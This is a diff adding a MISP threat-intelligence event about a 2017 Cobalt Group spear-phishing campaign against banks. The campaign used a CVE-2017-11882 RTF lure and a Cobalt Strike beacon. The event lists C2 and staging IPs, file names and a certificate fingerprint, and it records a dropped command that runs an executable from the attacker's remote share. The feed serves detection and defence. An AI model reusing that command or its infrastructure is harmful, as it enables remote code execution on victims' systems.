@@ -1,0 +1,171 @@
+{
+    "Event":{
+        "threat_level_id":"3",
+        "date":"2017-12-04",
+        "published":true,
+        "info":"OSINT - Gaffe Reveals Full List of Targets in Spear Phishing Attack Using Cobalt Strike Against Financial Institutions",
+        "publish_timestamp":"1514467711",
+        "timestamp":"1512442830",
+        "Tag":[
+            {
+                "name":"misp-galaxy:threat-actor=\"Cobalt\""
+            },
+            {
+                "name":"tlp:white"
+            },
+            {
+                "name":"circl:topic=\"finance\""
+            }
+        ],
+        "Attribute":[
+            {
+                "category":"External analysis",
+                "comment":"",
+                "timestamp":"1512378829",
+                "type":"link",
+                "value":"https://www.riskiq.com/blog/labs/cobalt-strike/",
+                "to_ids":false
+            },
+            {
+                "category":"External analysis",
+                "comment":"",
+                "timestamp":"1512378829",
+                "type":"text",
+                "value":"In a recent spear-phishing campaign, the Cobalt Hacking Group used a remote code execution vulnerability in Microsoft Office software to connect to its command and control server via Cobalt Strike. However, they gave up much more information than they intended.\r\n\r\nOn Tuesday, November 21, a massive spear-phishing campaign began targeting individual employees at various financial institutions, mostly in Russia and Turkey. Purporting to provide info on changes to â€˜SWIFTâ€™ terms, the email contained a single attachment with no text in the body.",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"",
+                "timestamp":"1512380693",
+                "type":"vulnerability",
+                "value":"CVE-2017-11882",
+                "to_ids":false
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1512380719",
+                "type":"text",
+                "value":"cmd /c start \\\\138.68.234.128\\w\\w.exe &AAAAAC",
+                "to_ids":true
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"At RiskIQ, one of the datasets built from our large quantities of Internet data is a repository of SSL certificates and where weâ€™ve seen them. Whatâ€™s interesting about the case mentioned above is that the host is using a certificate seemingly shipped with Cobalt Strike by default. We can look up the certificate in RiskIQ Community via its SHA1 fingerprint",
+                "timestamp":"1512380757",
+                "type":"x509-fingerprint-sha1",
+                "value":"6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c",
+                "to_ids":true
+            },
+            {
+                "category":"External analysis",
+                "comment":"",
+                "timestamp":"1512380798",
+                "type":"link",
+                "value":"https://community.riskiq.com/projects/19bb67dd-2c51-7284-e5f2-7b79537e13d3",
+                "to_ids":false
+            },
+            {
+                "category":"Network activity",
+                "comment":"Payload staging server",
+                "timestamp":"1512380833",
+                "type":"ip-dst",
+                "value":"138.68.234.128",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"Cobalt Strike server",
+                "timestamp":"1512380833",
+                "type":"ip-dst",
+                "value":"104.144.207.207",
+                "to_ids":true
+            }
+        ],
+        "Object":[
+            {
+                "comment":"",
+                "description":"File object describing a file with meta-information",
+                "meta-category":"file",
+                "name":"file",
+                "timestamp":"1512380890",
+                "Attribute":[
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1512380890",
+                        "type":"text",
+                        "value":"CVE-2017-11882 exploit document downloading Cobalt Strike beacon",
+                        "to_ids":false
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1512380890",
+                        "type":"filename",
+                        "value":"Swift changes.rtf",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1512380890",
+                        "type":"md5",
+                        "value":"<md5>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1512380890",
+                        "type":"text",
+                        "value":"Malicious",
+                        "to_ids":false
+                    }
+                ]
+            },
+            {
+                "comment":"",
+                "description":"File object describing a file with meta-information",
+                "meta-category":"file",
+                "name":"file",
+                "timestamp":"1512380963",
+                "Attribute":[
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1512380963",
+                        "type":"text",
+                        "value":"Cobalt Strike beacon",
+                        "to_ids":false
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1512380963",
+                        "type":"filename",
+                        "value":"w.exe",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1512380963",
+                        "type":"md5",
+                        "value":"<md5>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1512380963",
+                        "type":"text",
+                        "value":"Malicious",
+                        "to_ids":false
+                    }
+                ]
+            }
+        ]
+    }
+}
